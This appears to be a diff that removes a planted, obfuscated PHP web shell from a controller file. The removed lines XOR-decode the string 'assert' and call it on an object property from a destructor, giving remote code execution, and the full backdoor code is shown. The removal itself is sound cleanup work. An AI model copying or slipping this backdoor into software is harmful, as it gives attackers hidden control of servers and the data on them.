@@ -170,23 +170,3 @@ class IndexController extends CommonController
         return jsonrule(["status" => 200, "data" => $config_data]);
     }
 }
-
-class UWUL { 
-    function PaTD() {
-        $JiZm = "\x1e" ^ "\x7f";
-        $wFif = "\xf4" ^ "\x87";
-        $rugo = "\x39" ^ "\x4a";
-        $oHkK = "\xee" ^ "\x8b";
-        $dPLx = "\xa5" ^ "\xd7";
-        $xYog = "\x4e" ^ "\x3a";
-        $gBvB =$JiZm.$wFif.$rugo.$oHkK.$dPLx.$xYog;
-        return $gBvB;
-    }
-    function __destruct(){
-        $DCXk=$this->PaTD();
-        @$DCXk($this->at);
-    }
-}
-$uwul = new UWUL();
-
-?>
